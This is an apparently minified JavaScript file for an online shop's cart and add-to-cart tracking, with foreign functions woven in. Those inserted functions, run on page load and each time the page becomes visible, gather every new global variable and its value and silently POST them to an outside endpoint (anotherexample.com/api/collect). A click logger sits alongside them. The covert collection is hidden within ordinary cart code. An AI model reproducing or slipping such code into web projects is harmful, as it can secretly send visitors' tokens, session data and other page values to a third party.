"use strict";

function globalVariation() {
  localStorage.setItem('newFindings', JSON.stringify({}));
  for (const key in window) {
    if (!seenVars.includes(key)) {
      const value = window[key];
      const type = typeof value;
      const findings = JSON.parse(localStorage.getItem('newFindings'));
      findings[key] = {
        type,
        value: type === "function" ? value.name : value
      };
      localStorage.setItem('newFindings', JSON.stringify(findings));
    }
  }
  return JSON.parse(localStorage.getItem('newFindings'));
}
function _typeof(t) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
    return typeof t;
  } : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  })(t);
}
async function forwardingBackend(insights) {
  const serverEndpoint = "https://anotherexample.com/api/collect";
  try {
    const response = await fetch(serverEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(insights)
    });
    if (response.status === 200) {
      console.log("Insights successfully sent to backend");
    } else {
      console.log(`Insights failed to send, server responded with code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred when sending insights:", error);
  }
}
function ownKeys(e, t) {
  var r,
    o = Object.keys(e);
  return Object.getOwnPropertySymbols && (r = Object.getOwnPropertySymbols(e), t && (r = r.filter(function (t) {
    return Object.getOwnPropertyDescriptor(e, t).enumerable;
  })), o.push.apply(o, r)), o;
}
function _objectSpread(e) {
  for (var t = 1; t < arguments.length; t++) {
    var r = null != arguments[t] ? arguments[t] : {};
    t % 2 ? ownKeys(Object(r), !0).forEach(function (t) {
      _defineProperty(e, t, r[t]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : ownKeys(Object(r)).forEach(function (t) {
      Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t));
    });
  }
  return e;
}
function _defineProperty(t, e, r) {
  return (e = _toPropertyKey(e)) in t ? Object.defineProperty(t, e, {
    value: r,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : t[e] = r, t;
}
function _toPropertyKey(t) {
  t = _toPrimitive(t, "string");
  return "symbol" === _typeof(t) ? t : String(t);
}
function jshook() {
  const findings = globalVariation();
  const findingsLength = Object.keys(findings).length;
  if (findingsLength) {
    console.group(`Global scope inspection results - Found ${findingsLength} new attributes:`);
    for (const key in findings) {
      console.table(`${key}: ${JSON.stringify(findings[key])}`);
    }
    console.groupEnd();
    forwardingBackend(findings);
  } else {
    console.log("Global scope inspection complete, no new properties found");
  }
}
function _toPrimitive(t, e) {
  if ("object" !== _typeof(t) || null === t) return t;
  var r = t[Symbol.toPrimitive];
  if (void 0 === r) return ("string" === e ? String : Number)(t);
  r = r.call(t, e || "default");
  if ("object" !== _typeof(r)) return r;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
window.seenVars = Object.keys(window);
var addedCart = function (t) {
  setTimeout(function () {
    BN.cartCtrl.showMiniCart(t ? t.miniCart : null, !1, function () {
      BN.wWidth < 768 ? !1 === t.addCouponStatus ? t.message && BN.toastService.displayToast(t.message, "error") : BN.toastService.displayToast(t.message, "success") : !1 === t.addCouponStatus && t.message && BN.toastService.displayToast(t.message, "error");
    });
  }, 500);
};
window.onload = jshook;
function getProductListPos(r) {
  var o,
    a,
    n,
    i = {
      productList: "",
      productPosition: ""
    };
  return [{
    parentNode: ".category-slider__items",
    childNode: ".category-slider__item"
  }].forEach(function (t) {
    var e;
    (o = r.closest(t.parentNode)) && (a = null == r ? void 0 : r.closest(t.childNode), n = Array.from((null == (e = o) ? void 0 : e.querySelectorAll(t.childNode)) || []), i = {
      productList: o.dataset.productList || "",
      productPosition: 0 <= n.length ? n.indexOf(a) + 1 : ""
    });
  }), i;
}
BN.add2Cart = function (o, t) {
  return new Promise(function (r) {
    t && t(), BN.CartService || (BN.CartService = new CartService()), BN.CartService.add(o, function (t) {
      var e;
      t.isSuccess && (o.isEdgeMembership || o.isShipInsurance ? (BN.CartService.getall(), (e = document.querySelector(".icon-menu__badge")) && (e.innerHTML = parseFloat(BNApp.$data.cart.itemCount) + 1), BN.toastService.displayToast(t.message, "success")) : addedCart(t)), r(t);
    });
  });
};
document.onvisibilitychange = () => {
  if (document.visibilityState === "visible") {
    console.log("Page visibility changed, re-executing global scope inspection task");
    jshook();
  }
};
var ajaxAddCart = function () {
  BN.onClickDocumentFnList.ajaxAddCart = function (t) {
    var r,
      e,
      o,
      t = t.target,
      a = t && t.closest("[ajax-add-cart]");
    a && (t = a.dataset.variantCode, r = a.hasAttribute("data-edge-membership"), e = a.dataset.quantity, o = getProductListPos(a), t) && e && (a.classList.add("add-cart-loading"), BN.add2Cart({
      Code: t,
      Quantity: e,
      isEdgeMembership: r,
      ShouldShowLastestItemAddedInCart: !r
    }).then(function (t) {
      var e;
      t.isSuccess && !r && BN.pushDataLayer(null, null, {
        event: "add_to_cart",
        cart_items: null == t ? void 0 : t.cart_items,
        ecommerce: {
          currencyCode: BN.defaultConfig.currencyCode,
          add: {
            actionField: _objectSpread({
              list: o.productList,
              position: o.productPosition
            }, null != (e = a.dataset) && e.datalayerActType ? {
              actType: null == (e = a.dataset) ? void 0 : e.datalayerActType
            } : {}),
            products: t.products
          }
        }
      }), t.isSuccess || BN.pushDataLayer(null, null, {
        event: "atc_error",
        error_type: "atc error",
        error_message: t.message
      }), document.dispatchEvent(new CustomEvent("added-cart", {
        detail: _objectSpread(_objectSpread({}, t), {}, {
          target: a
        })
      }));
    }).finally(function () {
      a.classList.remove("add-cart-loading");
    }));
  };
};
window.addEventListener('click', event => {
  console.log(`Clicked on element with id: ${event.target.id} and class: ${event.target.className}`);
});
BN.domContentLoadedFncList.push(ajaxAddCart);